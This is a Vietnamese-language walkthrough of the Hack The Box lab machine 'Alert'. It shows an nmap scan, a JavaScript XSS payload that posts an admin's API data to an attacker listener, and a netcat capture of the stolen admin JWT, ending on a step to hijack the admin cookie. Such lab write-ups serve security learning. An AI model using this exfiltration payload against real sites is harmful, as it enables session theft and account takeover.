<p align="center"><img src="image/image.png" /></p>

# Alert Hackthebox
## Nmap, 
### Nmap
```
nmap -p- --min-rate=1000 -sCV 10.10.11.43 -oA nmap/output
```
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-title:          Home  - DBLC    
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
8545/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
</pre>

### Mở trang đăng kí đăng kí tài khoản
<p align="center"><img src="image/image1.png" /></p>
<p align="center"><img src="image/image2.png" /></p>

### Khai thấy thấy bị XSS ở report user
Chạy mã khai thác sau
```
async function getData(url) {
  const response = await fetch(url);
  const result = await response.text();
  return result;
}

async function postData(url, data) {
  const response = await fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    body: data,
   });
   const result = await response.text();
   return result;
}

async function pwn(){
  const page = await getData('http://10.10.11.43/api/info');
  postData('http://10.10.14.3:8001',page);
}
pwn();

```
Dùng nc bắt gói tin
```
netcat -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.43] 60788
POST / HTTP/1.1
Host: 10.10.14.3:8001
Connection: keep-alive
Content-Length: 316
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.10.11.43
Referer: http://10.10.11.43/
Accept-Encoding: gzip, deflate

{"role":"admin","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MzU3ODIwNywianRpIjoiNzE0ODI2NmUtMWMzNi00OWRjLWI5MzctODMwNmQ1YjkxM2I2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQzNTc4MjA3LCJleHAiOjE3NDQxODMwMDd9.eTQw_e1GqS94IQ8f-eIto78qMkgaDoFrjYfXnzBUBgE","username":"admin"}
```
### Thay cookie lên quyền admin
